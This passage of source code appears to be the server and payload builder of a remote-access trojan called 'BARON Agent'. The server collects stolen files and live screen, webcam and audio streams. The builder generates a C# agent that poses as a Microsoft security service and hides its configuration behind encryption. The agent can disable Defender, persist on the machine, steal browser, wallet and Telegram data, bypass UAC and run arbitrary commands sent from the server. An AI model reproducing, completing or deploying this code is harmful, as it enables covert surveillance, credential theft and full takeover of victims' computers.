    if len(results[cid]) > 100:
        results[cid] = results[cid][-100:]
    state.set('results', results)

    # Emit to panel via WebSocket
    socketio.emit('result', {
        'cid': cid,
        'type': result_type,
        'data': result_data[:10000],
        'time': time.time()
    }, room='panel')

    return jsonify({'ok': True})


@app.route('/api/stream', methods=['POST'])
def agent_stream():
    """Agent sends stream frames (screen/webcam)"""
    cid = request.args.get('id', request.headers.get('X-Client-ID', ''))
    stream_type = request.args.get('type', request.headers.get('X-Stream-Type', 'screen'))

    if not cid:
        return jsonify({'ok': False}), 400

    data = request.get_json(silent=True) or {}
    frame_data = data.get('data', '')

    if not frame_data:
        return jsonify({'ok': False}), 400

    # Emit to panel
    socketio.emit('stream_frame', {
        'cid': cid,
        'type': stream_type,
        'data': frame_data[:500000],  # ~500KB max frame
        'time': time.time()
    }, room='panel')

    return jsonify({'ok': True})


@app.route('/api/audio_stream', methods=['POST'])
def agent_audio_stream():
    """Agent sends audio chunks"""
    cid = request.args.get('id', request.headers.get('X-Client-ID', ''))
    if not cid:
        return jsonify({'ok': False}), 400

    audio_data = request.get_data()

    socketio.emit('audio_chunk', {
        'cid': cid,
        'size': len(audio_data),
        'data': base64.b64encode(audio_data).decode()[:200000],
        'time': time.time()
    }, room='panel')

    return jsonify({'ok': True})


@app.route('/api/agent/exfil', methods=['POST'])
def agent_exfil():
    """Agent uploads a file (exfiltration)"""
    cid = request.headers.get('X-Client-ID', '')
    filename = request.headers.get('X-Filename', 'unknown')

    if not cid:
        return jsonify({'ok': False}), 400

    file_data = request.get_data()
    if not file_data:
        return jsonify({'ok': False}), 400

    safe_name = re.sub(r'[^\w\-.]', '_', filename)
    file_id = secrets.token_hex(8)
    save_path = os.path.join(Config.UPLOAD_DIR, f"{file_id}_{cid[:8]}_{safe_name}")

    with open(save_path, 'wb') as f:
        f.write(file_data)

    uploads = state.get('uploads') or []
    uploads.append({
        'id': file_id,
        'name': f"[{cid[:8]}] {safe_name}",
        'path': save_path,
        'size': len(file_data),
        'time': time.time(),
        'uploaded_by': f'agent:{cid[:8]}'
    })
    state.set('uploads', uploads)

    state.append_log(f"Agent upload: {safe_name} from {cid[:8]} ({len(file_data)} bytes)", 'info')

    return jsonify({'ok': True, 'id': file_id})

# ══════════════════════════════════════════════════════════════
# BUILDER — Generate agent payload
# ══════════════════════════════════════════════════════════════

@app.route('/api/panel/build', methods=['POST'])
@require_auth
def panel_build():
    """Build agent executable"""
    data = request.get_json(silent=True) or {}

    bc = {
        'server': data.get('server', '').strip().rstrip('/'),
        'name': re.sub(r'[^\w]', '', data.get('name', 'svchost')),
        'id': data.get('id', 'AUTO').strip(),
        'beacon': int(data.get('beacon_interval', data.get('beacon', 5000))),
        'hidden': data.get('hidden', True),
        'persistence': data.get('persistence', data.get('persist', False)),
        'anti_kill': data.get('anti_kill', data.get('bsod', False)),
        'disable_defender': data.get('disable_defender', data.get('defender', False)),
        'fake_error': data.get('fake_error', False),
        'fake_error_msg': data.get('fake_error_msg', 'This application requires .NET 6.0'),
        'anti_analysis': data.get('anti_analysis', data.get('anti', False)),
        'debug': data.get('debug', False),
    }

    if bc['debug']:
        bc['hidden'] = False  # Always show console in debug mode

    if not bc['server']:
        return jsonify({'ok': False, 'error': 'Server URL required'}), 400

    if not bc['server'].startswith('http://') and not bc['server'].startswith('https://'):
        bc['server'] = 'http://' + bc['server']

    if bc['id'] == 'AUTO':
        bc['id'] = secrets.token_hex(8)

    try:
        source = generate_agent_source(bc)
    except Exception as e:
        logger.error(f"Build generation error: {e}")
        return jsonify({'ok': False, 'error': str(e)}), 500

    # Build signature
    build_sig = hashlib.sha256(source.encode()).hexdigest()[:16]
    state.append_log(f"Build: {bc['name']} (sig:{build_sig}) by {request.session.get('user','?')}", 'info')

    result = {
        'ok': True,
        'source': source,
        'build_sig': build_sig,
        'name': bc['name'],
        'compile_status': 'no_compiler',
        'compile_error': None,
        'download_url': None
    }

    # Try to compile
    compiler = find_csharp_compiler()
    if compiler:
        try:
            exe_path = compile_agent(source, bc['name'], compiler, bc['hidden'])
            if exe_path and os.path.exists(exe_path):
                # Save to BUILD_DIR with accessible name
                final_name = f"{bc['name']}_{build_sig}.exe"
                final_path = os.path.join(Config.BUILD_DIR, final_name)
                shutil.copy2(exe_path, final_path)
                result['compile_status'] = 'success'
                
                # Append token so browser download works
                token = request.headers.get('X-Token', '')
                result['download_url'] = f"/api/panel/download_build?file={final_name}&token={token}"
                
                state.append_log(f"Build compiled: {final_name}", 'info')
            else:
                result['compile_status'] = 'failed'
                result['compile_error'] = 'Compilation failed. Check server logs.'
        except Exception as e:
            logger.error(f"Compilation error: {e}")
            result['compile_status'] = 'failed'
            result['compile_error'] = str(e)
    else:
        result['compile_status'] = 'no_compiler'
        result['compile_error'] = 'No C# compiler (mcs/csc) found on server. Source code returned.'

    # Always save .cs source
    source_path = os.path.join(Config.BUILD_DIR, f"{bc['name']}_{build_sig}.cs")
    with open(source_path, 'w', encoding='utf-8') as f:
        f.write(source)

    return jsonify(result)


@app.route('/api/panel/download_build')
@require_auth
def download_build():
    """Download compiled build"""
    filename = request.args.get('file', '')
    filename = re.sub(r'[^\w.\-]', '', filename)  # Sanitize
    filepath = os.path.join(Config.BUILD_DIR, filename)
    if os.path.exists(filepath):
        return send_file(filepath, as_attachment=True, download_name=filename,
                         mimetype='application/octet-stream')
    return jsonify({'ok': False, 'error': 'File not found'}), 404



def find_csharp_compiler():
    """Find available C# compiler"""
    for cmd in ['mcs', 'csc', '/usr/bin/mcs', '/usr/local/bin/mcs']:
        if shutil.which(cmd):
            return cmd
    return None


def compile_agent(source, name, compiler, hidden=True):
    """Compile C# source to executable"""
    build_dir = tempfile.mkdtemp(dir=Config.BUILD_DIR)
    source_path = os.path.join(build_dir, f"{name}.cs")
    exe_path = os.path.join(build_dir, f"{name}.exe")

    with open(source_path, 'w', encoding='utf-8') as f:
        f.write(source)

    target = 'winexe' if hidden else 'exe'

    # Build command based on compiler
    if 'mcs' in compiler:
        cmd = [
            compiler,
            f'-target:{target}',
            '-optimize+',
            f'-out:{exe_path}',
            '-r:System.dll',
            '-r:System.Net.Http.dll',
            '-r:System.Drawing.dll',
            '-r:System.Windows.Forms.dll',
            '-r:System.Management.dll',
            '-r:System.Security.dll',
            '-warn:0',
            '-nowarn:CS1701',
            source_path
        ]
    else:
        cmd = [
            compiler,
            f'/target:{target}',
            '/optimize+',
            f'/out:{exe_path}',
            '/r:System.dll',
            '/r:System.Net.Http.dll',
            '/r:System.Drawing.dll',
            '/r:System.Windows.Forms.dll',
            '/r:System.Management.dll',
            '/r:System.Security.dll',
            '/warn:0',
            source_path
        ]

    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=120
        )
        if result.returncode == 0 and os.path.exists(exe_path):
            return exe_path
        else:
            logger.error(f"Compile error: {result.stderr}")
            return None
    except Exception as e:
        logger.error(f"Compile exception: {e}")
        return None


def encrypt_string(text, key_bytes):
    """XOR encrypt a string and return base64"""
    text_bytes = text.encode('utf-8')
    encrypted = bytes(b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(text_bytes))
    return base64.b64encode(encrypted).decode()


def generate_agent_source(bc):
    """Generate full C# agent source code"""

    # Generate encryption keys
    str_key = secrets.token_bytes(16)
    str_key_hex = str_key.hex()
    comm_key = secrets.token_bytes(32)
    comm_key_hex = comm_key.hex()

    # Encrypt config values
    enc_server = encrypt_string(bc['server'], str_key)
    enc_id = encrypt_string(bc['id'], str_key)
    enc_name = encrypt_string(bc['name'], str_key)
    enc_comm_key = encrypt_string(comm_key_hex, str_key)

    # Fake error message
    enc_fake_msg = encrypt_string(bc.get('fake_error_msg', ''), str_key)

    # Build signature
    build_sig = hashlib.sha256(f"{bc['server']}{bc['id']}{time.time()}".encode()).hexdigest()[:16]

    # ── Persistence code ──
    persistence_code = ""
    if bc['persistence']:
        persistence_code = _generate_persistence_code()

    # ── Anti-kill code ──
    anti_kill_code = ""
    if bc['anti_kill']:
        anti_kill_code = _generate_anti_kill_code()

    # ── Disable defender code ──
    disable_defender_code = ""
    if bc['disable_defender']:
        disable_defender_code = _generate_disable_defender_code()

    # ── Anti-analysis code (optional) ──
    anti_analysis_code = ""
    if bc['anti_analysis']:
        anti_analysis_code = _generate_anti_analysis_code()

    # ── Feature modules ──
    browser_stealer_code = _generate_browser_stealer_code()
    clipboard_code = _generate_clipboard_code()
    file_manager_code = _generate_file_manager_code()
    network_scanner_code = _generate_network_scanner_code()
    sys_restore_kill_code = _generate_sys_restore_kill_code()
    realtime_audio_code = _generate_realtime_audio_code()
    webcam_real_code = _generate_webcam_real_code()
    screenshot_on_click_code = _generate_screenshot_on_click_code()
    crypto_wallet_code = _generate_crypto_wallet_code()
    telegram_stealer_code = _generate_telegram_stealer_code()
    uac_bypass_code = _generate_uac_bypass_code()
    reverse_proxy_code = _generate_reverse_proxy_code()
    startup_hide_code = _generate_startup_hide_code()

    # ── Conditional calls ──
    fake_error_call = ""
    if bc['fake_error']:
        fake_error_call = f'if (true) {{ MessageBox.Show(DecStr("{enc_fake_msg}"), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error); }}'

    disable_defender_call = 'DisableDefender();' if bc['disable_defender'] else ''
    persistence_call = 'InstallPersistenceQuiet();' if bc['persistence'] else ''
    anti_kill_call = 'StartAntiKill();' if bc['anti_kill'] else ''

    # ── Main source template ──
    # Using string concatenation to avoid triple-quote issues with C# @ strings
    source = (
        "// ==================================================================\n"
        "// BARON Agent v4.0 -- Generated Build\n"
        "// Build Signature: " + build_sig + "\n"
        "// ==================================================================\n"
        "\n"
        "using System;\n"
        "using System.IO;\n"
        "using System.Net;\n"
        "using System.Text;\n"
        "using System.Linq;\n"
        "using System.Threading;\n"
        "using System.Diagnostics;\n"
        "using System.Drawing;\n"
        "using System.Drawing.Imaging;\n"
        "using System.Runtime.InteropServices;\n"
        "using System.Collections.Generic;\n"
        "using System.Management;\n"
        "using System.Windows.Forms;\n"
        "\n"
        '[assembly: System.Reflection.AssemblyTitle("Windows Security Health Service")]\n'
        '[assembly: System.Reflection.AssemblyDescription("Microsoft Windows Security")]\n'
        '[assembly: System.Reflection.AssemblyCompany("Microsoft Corporation")]\n'
        '[assembly: System.Reflection.AssemblyProduct("Microsoft Windows Operating System")]\n'
        '[assembly: System.Reflection.AssemblyCopyright("Microsoft Corporation. All rights reserved.")]\n'
        '[assembly: System.Reflection.AssemblyVersion("10.0.19041.1")]\n'
        "\n"
        "namespace WinSecHealthSvc\n"
        "{\n"
        "    // ---- WASAPI COM Interfaces ----\n"
        '    [ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")]\n'
        "    class MMDeviceEnumerator { }\n"
        "\n"
        '    [ComImport, Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"),\n'
        "     InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]\n"
        "    interface IMMDeviceEnumerator {\n"
        "        int EnumAudioEndpoints(int dataFlow, int stateMask, out IntPtr devices);\n"
        "        int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice device);\n"
        "    }\n"
        "\n"
        '    [ComImport, Guid("D666063F-1587-4E43-81F1-B948E807363F"),\n'
        "     InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]\n"
        "    interface IMMDevice {\n"
        "        int Activate([MarshalAs(UnmanagedType.LPStruct)] Guid iid, int clsCtx,\n"
        "            IntPtr activationParams, [MarshalAs(UnmanagedType.IUnknown)] out object obj);\n"
        "    }\n"
        "\n"
        '    [ComImport, Guid("1CB9AD4C-DBFA-4c32-B178-C2F568A703B2"),\n'
        "     InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]\n"
        "    interface IAudioClient {\n"
        "        int Initialize(int shareMode, int streamFlags, long bufferDuration,\n"
        "            long periodicity, IntPtr format, [MarshalAs(UnmanagedType.LPStruct)] Guid sessionGuid);\n"
        "        int GetBufferSize(out uint numBufferFrames);\n"
        "        int GetStreamLatency(out long latency);\n"
        "        int GetCurrentPadding(out uint numPaddingFrames);\n"
        "        int IsFormatSupported(int shareMode, IntPtr format, out IntPtr closestMatch);\n"
        "        int GetMixFormat(out IntPtr format);\n"
        "        int GetDevicePeriod(out long defaultPeriod, out long minimumPeriod);\n"
        "        int Start();\n"
        "        int Stop();\n"
        "        int Reset();\n"
        "        int SetEventHandle(IntPtr eventHandle);\n"
        "        int GetService([MarshalAs(UnmanagedType.LPStruct)] Guid iid,\n"
        "            [MarshalAs(UnmanagedType.IUnknown)] out object obj);\n"
        "    }\n"
        "\n"
        '    [ComImport, Guid("C8ADBD64-E71E-48a0-A4DE-185C395CD317"),\n'
        "     InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]\n"
        "    interface IAudioCaptureClient {\n"
        "        int GetBuffer(out IntPtr dataPtr, out uint numFramesAvailable,\n"
        "            out uint flags, out ulong devicePosition, out ulong qpcPosition);\n"
        "        int ReleaseBuffer(uint numFramesRead);\n"
        "        int GetNextPacketSize(out uint numFramesInNextPacket);\n"
        "    }\n"
        "\n"
        "    [StructLayout(LayoutKind.Sequential)]\n"
        "    struct WAVEFORMATEX {\n"
        "        public ushort wFormatTag;\n"
        "        public ushort nChannels;\n"
        "        public uint nSamplesPerSec;\n"
        "        public uint nAvgBytesPerSec;\n"
        "        public ushort nBlockAlign;\n"
        "        public ushort wBitsPerSample;\n"
        "        public ushort cbSize;\n"
        "    }\n"
        "\n"
        "    static class Agent\n"
        "    {\n"
        "        // ---- Encrypted Configuration ----\n"
        '        static readonly byte[] _strKey = HexToBytes("' + str_key_hex + '");\n'
        "        static string _server;\n"
        "        static string _clientId;\n"
        "        static string _processName;\n"
        "        static string _commKeyHex;\n"
        "        static int _beaconInterval = " + str(bc['beacon']) + ";\n"
        "        static bool _debug = " + ('true' if (bc['debug'] or not bc['hidden']) else 'false') + ";\n"
        "        static void Log(string msg) {\n"
        "            if(_debug) {\n"
        "                try {\n"
        "                    Console.ForegroundColor = ConsoleColor.DarkGray;\n"
        "                    Console.Write(\"[\" + DateTime.Now.ToString(\"HH:mm:ss\") + \"] \");\n"
        "                    Console.ResetColor();\n"
        "                    Console.WriteLine(msg);\n"
        "                } catch {}\n"
        "            }\n"
        "        }\n"
        "\n"
        "        // ---- State ----\n"
        "        static bool _running = true;\n"
        "        static bool _screenStreaming = false;\n"
        "        static bool _keylogRunning = false;\n"
        "        static StringBuilder _keylog = new StringBuilder();\n"
        "\n"
        "        // ---- String Decryption ----\n"
        "        static string DecStr(string b64) {\n"
        "            byte[] enc = Convert.FromBase64String(b64);\n"
        "            byte[] dec = new byte[enc.Length];\n"
        "            for (int i = 0; i < enc.Length; i++)\n"
        "                dec[i] = (byte)(enc[i] ^ _strKey[i % _strKey.Length]);\n"
        "            return Encoding.UTF8.GetString(dec);\n"
        "        }\n"
        "\n"
        "        static byte[] HexToBytes(string hex) {\n"
        "            byte[] bytes = new byte[hex.Length / 2];\n"
        "            for (int i = 0; i < hex.Length; i += 2)\n"
        "                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);\n"
        "            return bytes;\n"
        "        }\n"
        "\n"
        "        // ---- Hidden PowerShell Execution ----\n"
        "        static void RunHiddenPS(string cmd) {\n"
        "            try {\n"
        "                var p = new ProcessStartInfo {\n"
        "                    FileName = \"powershell.exe\",\n"
        "                    Arguments = \"-NoP -NonI -W Hidden -Enc \" +\n"
        "                        Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes(cmd)),\n"
        "                    WindowStyle = ProcessWindowStyle.Hidden,\n"
        "                    CreateNoWindow = true,\n"
        "                    UseShellExecute = false\n"
        "                };\n"
        "                Process.Start(p);\n"
        "            } catch {}\n"
        "        }\n"
        "\n"
        "        // ---- HMAC Signing ----\n"
        "        static string SignMessage(string data) {\n"
        "            if (string.IsNullOrEmpty(_commKeyHex)) return \"\";\n"
        "            byte[] key = HexToBytes(_commKeyHex);\n"
        "            using (var hmac = new System.Security.Cryptography.HMACSHA256(key)) {\n"
        "                byte[] hash = hmac.ComputeHash(Encoding.UTF8.GetBytes(data));\n"
        '                return BitConverter.ToString(hash).Replace("-", "").ToLower();\n'
        "            }\n"
        "        }\n"
        "\n"
        "        // ==== MAIN ====\n"
        "        [STAThread]\n"
        "        static void Main() {\n"
        "            try {\n"
        "                // Force TLS 1.2 & Ignore Cert Errors\n"
        "                System.Net.ServicePointManager.SecurityProtocol = (System.Net.SecurityProtocolType)3072;\n"
        "                System.Net.ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };\n"
        "\n"
        "                // Decrypt config\n"
        '                _server = DecStr("' + enc_server + '");\n'
        '                _clientId = DecStr("' + enc_id + '");\n'
        '                _processName = DecStr("' + enc_name + '");\n'
        '                _commKeyHex = DecStr("' + enc_comm_key + '");\n'
        "\n"
        '                Log("=== AGENT STARTING ===");\n'
        '                Log("Server: " + _server);\n'
        '                Log("Client ID: " + _clientId);\n'
        "\n"
        "                " + fake_error_call + "\n"
        "\n"
        "                // Anti-Analysis\n"
        "                " + ('AntiAnalysisCheck();' if bc['anti_analysis'] else '') + "\n"
        "\n"
        "                " + disable_defender_call + "\n"
        "                " + persistence_call + "\n"
        "                " + anti_kill_call + "\n"
        "\n"
        "                // Set process name\n"
        "                try { Console.Title = _processName; } catch {}\n"
        "\n"
        "                // Register\n"
        "                Register();\n"
        "\n"
        "                // Main beacon loop\n"
        "                while (_running) {\n"
        "                    try {\n"
        "                        Beacon();\n"
        "                    } catch {}\n"
        "                    Thread.Sleep(_beaconInterval + new Random().Next(500));\n"
        "                }\n"
        "            } catch (Exception ex) {\n"
        "                if (_debug) {\n"
        '                    Console.ForegroundColor = ConsoleColor.Red;\n'
        '                    Console.WriteLine("FATAL: " + ex.ToString());\n'
        '                    Console.ResetColor();\n'
        '                    Console.WriteLine("Press Enter to exit...");\n'
        "                    try { Console.ReadLine(); } catch {}\n"
        "                }\n"
        "            }\n"
        "            if (_debug) {\n"
        '                Console.WriteLine("\\n[Agent exited. Press Enter to close]");\n'
        "                try { Console.ReadLine(); } catch {}\n"
        "            }\n"
        "        }\n"
        "\n"
        "        // ==== COMMS ====\n"
        "        static string Post(string url, string json) {\n"
        "            try {\n"
        '                Log("POST --> " + url);\n'
        "                var req = (HttpWebRequest)WebRequest.Create(url);\n"
        '                req.Method = "POST";\n'
        '                req.ContentType = "application/json";\n'
        '                req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";\n'
        "                req.Timeout = 15000;\n"
        "\n"
        "                string sig = SignMessage(json);\n"
        "                if (!string.IsNullOrEmpty(sig)) {\n"
        '                    req.Headers.Add("X-Signature", sig);\n'
        "                }\n"
        '                req.Headers.Add("X-Client-ID", _clientId);\n'
        "\n"
        "                byte[] data = Encoding.UTF8.GetBytes(json);\n"
        "                req.ContentLength = data.Length;\n"
        "                using (var s = req.GetRequestStream()) s.Write(data, 0, data.Length);\n"
        "                using (var r = (HttpWebResponse)req.GetResponse())\n"
        "                using (var sr = new StreamReader(r.GetResponseStream())) {\n"
        "                    string response = sr.ReadToEnd();\n"
        '                    Log("POST Response: " + response);\n'
        "                    return response;\n"
        "                }\n"
        '            } catch (Exception ex) { Log("POST ERROR (" + url + "): " + ex.Message); return "{}"; }\n'
        "        }\n"
        "\n"
        "        static void Beacon() {\n"
        "            try {\n"
        '                Log("Sending beacon...");\n'
        '                string json = string.Format("{{\\\"id\\\":\\\"{0}\\\"}}", Esc(_clientId));\n'
        '                string resp = Post(_server + "/api/agent/beacon", json);\n'
        "\n"
        "                // Normalize whitespace for reliable JSON parsing\n"
        '                string norm = resp.Replace(" ", "").Replace("\\t", "").Replace("\\r", "").Replace("\\n", "");\n'
        "\n"
        '                if (norm.Contains("\\\"t\\\":[{")) {\n'
        '                    Log("Found tasks in beacon response");\n'
        '                    int start = norm.IndexOf("\\\"t\\\":[") + 4;\n'
        "                    int end = norm.LastIndexOf(']') + 1;\n"
        "                    string tasksStr = norm.Substring(start, end - start);\n"
        "                    var tasks = ParseTaskArray(tasksStr);\n"
        "                    foreach (var task in tasks) {\n"
        '                        Log("Handling task: " + (task.ContainsKey("action") ? task["action"] : "?"));\n'
        '                        try { HandleTask(task); } catch (Exception tx) { Log("Task Error: " + tx.Message); }\n'
        "                    }\n"
        "                }\n"
        '            } catch (Exception ex) { Log("Beacon Exception: " + ex.Message); }\n'
        "        }\n"
        "\n"
        "        static void Register() {\n"
        "            try {\n"
        '                Log("Registering agent...");\n'
        "                string hostname = Environment.MachineName;\n"
        "                string username = Environment.UserName;\n"
        "                string os = Environment.OSVersion.ToString();\n"
        "                bool isAdmin = false;\n"
        "                try {\n"
        "                    var identity = System.Security.Principal.WindowsIdentity.GetCurrent();\n"
        "                    var principal = new System.Security.Principal.WindowsPrincipal(identity);\n"
        "                    isAdmin = principal.IsInRole(\n"
        "                        System.Security.Principal.WindowsBuiltInRole.Administrator);\n"
        "                } catch {}\n"
        "\n"
        "                string fingerprint = \"\";\n"
        "                try {\n"
        "                    var sb = new StringBuilder();\n"
        '                    sb.Append(hostname).Append("|").Append(username).Append("|");\n'
        "                    foreach (var ni in System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces()) {\n"
        "                        if (ni.OperationalStatus == System.Net.NetworkInformation.OperationalStatus.Up) {\n"
        "                            sb.Append(ni.GetPhysicalAddress().ToString());\n"
        "                            break;\n"
        "                        }\n"
        "                    }\n"
        "                    try {\n"
        '                        var mos = new ManagementObjectSearcher("SELECT ProcessorId FROM Win32_Processor");\n'
        "                        foreach (var mo in mos.Get()) {\n"
        '                            sb.Append("|").Append(mo["ProcessorId"]);\n'
        "                            break;\n"
        "                        }\n"
        "                    } catch {}\n"
        "                    fingerprint = HashString(sb.ToString());\n"
        "                } catch {}\n"
        "\n"
        "                string json = string.Format(\n"
        '                    "{{\\\"id\\\":\\\"{0}\\\",\\\"hostname\\\":\\\"{1}\\\",\\\"username\\\":\\\"{2}\\\"," +\n'
        '                    "\\\"os\\\":\\\"{3}\\\",\\\"is_admin\\\":{4},\\\"version\\\":\\\"4.0\\\"," +\n'
        '                    "\\\"fingerprint\\\":\\\"{5}\\\"}}",\n'
        "                    Esc(_clientId), Esc(hostname), Esc(username),\n"
        '                    Esc(os), isAdmin ? "true" : "false", fingerprint);\n'
        '                Post(_server + "/api/agent/register", json);\n'
        '                Log("Registration format valid, sent POST");\n'
        '            } catch (Exception ex) { Log("Register Exception: " + ex.Message); }\n'
        "        }\n"
        "\n"
        "        static string HashString(string s) {\n"
        "            using (var sha = System.Security.Cryptography.SHA256.Create()) {\n"
        "                byte[] hash = sha.ComputeHash(Encoding.UTF8.GetBytes(s));\n"
        '                return BitConverter.ToString(hash).Replace("-", "").ToLower().Substring(0, 32);\n'
        "            }\n"
        "        }\n"
        "\n"
        "        static List<Dictionary<string, string>> ParseTaskArray(string json) {\n"
        "            var result = new List<Dictionary<string, string>>();\n"
        "            int depth = 0;\n"
        "            int objStart = -1;\n"
        "            for (int i = 0; i < json.Length; i++) {\n"
        "                if (json[i] == '{') {\n"
        "                    if (depth == 0) objStart = i;\n"
        "                    depth++;\n"
        "                } else if (json[i] == '}') {\n"
        "                    depth--;\n"
        "                    if (depth == 0 && objStart >= 0) {\n"
        "                        string obj = json.Substring(objStart, i - objStart + 1);\n"
        "                        result.Add(ParseSimpleJson(obj));\n"
        "                        objStart = -1;\n"
        "                    }\n"
        "                }\n"
        "            }\n"
        "            return result;\n"
        "        }\n"
        "\n"
        "        static Dictionary<string, string> ParseSimpleJson(string json) {\n"
        "            var dict = new Dictionary<string, string>();\n"
        "            json = json.Trim().TrimStart(new char[] { '{' }).TrimEnd(new char[] { '}' });\n"
        "            bool inString = false;\n"
        "            int kvStart = 0;\n"
        "            for (int i = 0; i <= json.Length; i++) {\n"
        "                char c = i < json.Length ? json[i] : ',';\n"
        '                if (c == \'\\"\') inString = !inString;\n'
        "                if (!inString && (c == ',' || i == json.Length)) {\n"
        "                    string kv = json.Substring(kvStart, i - kvStart).Trim();\n"
        "                    kvStart = i + 1;\n"
        "                    int colon = kv.IndexOf(':');\n"
        "                    if (colon > 0) {\n"
        '                        string key = kv.Substring(0, colon).Trim().Trim(new char[] { \'\\"\' });\n'
        '                        string val = kv.Substring(colon + 1).Trim().Trim(new char[] { \'\\"\' });\n'
        '                        if (val == "true") val = "True";\n'
        '                        if (val == "false") val = "False";\n'
        "                        dict[key] = val;\n"
        "                    }\n"
        "                }\n"
        "            }\n"
        "            return dict;\n"
        "        }\n"
        "\n"
        "        static void Res(string type, string data) {\n"
        "            Log(\"[RESULT] \" + type + \": \" + (data.Length > 200 ? data.Substring(0, 200) + \"...\" : data));\n"
        "            string json = string.Format(\n"
        '                "{{\\\"id\\\":\\\"{0}\\\",\\\"type\\\":\\\"{1}\\\",\\\"data\\\":\\\"{2}\\\"}}",\n'
        "                Esc(_clientId), Esc(type), Esc(data));\n"
        '            Post(_server + "/api/agent/result", json);\n'
        "        }\n"
        "\n"
        "        static void SendStreamFrame(string type, string b64Data) {\n"
        "            try {\n"
        '                string json = string.Format("{{\\\"data\\\":\\\"{0}\\\"}}", b64Data);\n'
        "                var req = (HttpWebRequest)WebRequest.Create(\n"
        '                    _server + "/api/stream?id=" + Uri.EscapeDataString(_clientId) +\n'
        '                    "&type=" + type);\n'
        '                req.Method = "POST";\n'
        '                req.ContentType = "application/json";\n'
        '                req.Headers.Add("X-Client-ID", _clientId);\n'
        '                req.Headers.Add("X-Stream-Type", type);\n'
        "                req.Timeout = 5000;\n"
        "                byte[] data = Encoding.UTF8.GetBytes(json);\n"
        "                req.ContentLength = data.Length;\n"
        "                using (var s = req.GetRequestStream()) s.Write(data, 0, data.Length);\n"
        "                req.GetResponse().Close();\n"
        "            } catch {}\n"
        "        }\n"
        "\n"
        "        static string Esc(string s) {\n"
        '            if (s == null) return "";\n'
        '            return s.Replace("\\\\", "\\\\\\\\").Replace("\\"", "\\\\\\"")\n'
        '                .Replace("\\n", "\\\\n").Replace("\\r", "\\\\r").Replace("\\t", "\\\\t");\n'
        "        }\n"
        "\n"
        "        // ==== TASK HANDLER ====\n"
        "        static void HandleTask(Dictionary<string, string> task) {\n"
        '            string action = task.ContainsKey("action") ? task["action"] : "";\n'
        "\n"
        "            switch (action) {\n"
        '                case "exec":\n'
        '                    string cmd = task.ContainsKey("cmd") ? task["cmd"] : "";\n'
        "                    try {\n"
        "                        var psi = new ProcessStartInfo {\n"
        '                            FileName = "cmd.exe",\n'
        '                            Arguments = "/c " + cmd,\n'
        "                            RedirectStandardOutput = true,\n"
        "                            RedirectStandardError = true,\n"
        "                            UseShellExecute = false,\n"
        "                            CreateNoWindow = true\n"
        "                        };\n"
        "                        var p = Process.Start(psi);\n"
        "                        string output = p.StandardOutput.ReadToEnd();\n"
        "                        string error = p.StandardError.ReadToEnd();\n"
        "                        p.WaitForExit(30000);\n"
        '                        Res("exec", output + (string.IsNullOrEmpty(error) ? "" : "\\n[STDERR] " + error));\n'
        "                    } catch (Exception ex) {\n"
        '                        Res("error", "Exec failed: " + ex.Message);\n'
        "                    }\n"
        "                    break;\n"
        "\n"
        '                case "info":\n'
        '                case "system":\n'
        "                    try {\n"
        "                        var sb = new StringBuilder();\n"
        '                        sb.AppendLine("=== BARON System Info ===");\n'
        '                        sb.AppendLine("Hostname: " + Environment.MachineName);\n'
        '                        sb.AppendLine("Username: " + Environment.UserName);\n'
        '                        sb.AppendLine("Domain: " + Environment.UserDomainName);\n'
        '                        sb.AppendLine("OS: " + Environment.OSVersion);\n'
        '                        sb.AppendLine("64-bit OS: " + Environment.Is64BitOperatingSystem);\n'
        '                        sb.AppendLine("Processors: " + Environment.ProcessorCount);\n'
        '                        sb.AppendLine("CLR: " + Environment.Version);\n'
        '                        sb.AppendLine("Uptime: " + TimeSpan.FromMilliseconds(Environment.TickCount));\n'
        "\n"
        '                        sb.AppendLine("\\n=== Network ===");\n'
        "                        foreach (var ni in System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces()) {\n"
        "                            if (ni.OperationalStatus == System.Net.NetworkInformation.OperationalStatus.Up) {\n"
        '                                sb.AppendLine(ni.Name + " (" + ni.NetworkInterfaceType + ")");\n'
        "                                foreach (var addr in ni.GetIPProperties().UnicastAddresses) {\n"
        '                                    sb.AppendLine("  IP: " + addr.Address);\n'
        "                                }\n"
        "                            }\n"
        "                        }\n"
        "\n"
        '                        sb.AppendLine("\\n=== Drives ===");\n'
        "                        foreach (var d in DriveInfo.GetDrives()) {\n"
        "                            try {\n"
        "                                if (d.IsReady)\n"
        '                                    sb.AppendFormat("{0} {1} Free:{2:F1}GB/{3:F1}GB\\n",\n'
        "                                        d.Name, d.DriveType,\n"
        "                                        d.AvailableFreeSpace / 1073741824.0,\n"
        "                                        d.TotalSize / 1073741824.0);\n"
        "                            } catch {}\n"
        "                        }\n"
        "\n"
        '                        sb.AppendLine("\\n=== Security Products ===");\n'
        "                        try {\n"
        "                            var mos = new ManagementObjectSearcher(\n"
        '                                @"root\\SecurityCenter2",\n'
        '                                "SELECT displayName FROM AntiVirusProduct");\n'
        "                            foreach (var o in mos.Get())\n"
        '                                sb.AppendLine("AV: " + o["displayName"]);\n'
        '                        } catch { sb.AppendLine("(Cannot query SecurityCenter2)"); }\n'
        "\n"
        '                        Res("info", sb.ToString());\n'
        '                    } catch (Exception ex) { Res("error", "Info error: " + ex.Message); }\n'
        "                    break;\n"
        "\n"
        '                case "screen_start":\n'
        "                    if (!_screenStreaming) {\n"
        "                        _screenStreaming = true;\n"
        "                        new Thread(() => {\n"
        "                            Thread.CurrentThread.IsBackground = true;\n"
        "                            while (_screenStreaming) {\n"
        "                                try {\n"
        "                                    CaptureScreenAndSend();\n"
        "                                    Thread.Sleep(150);\n"
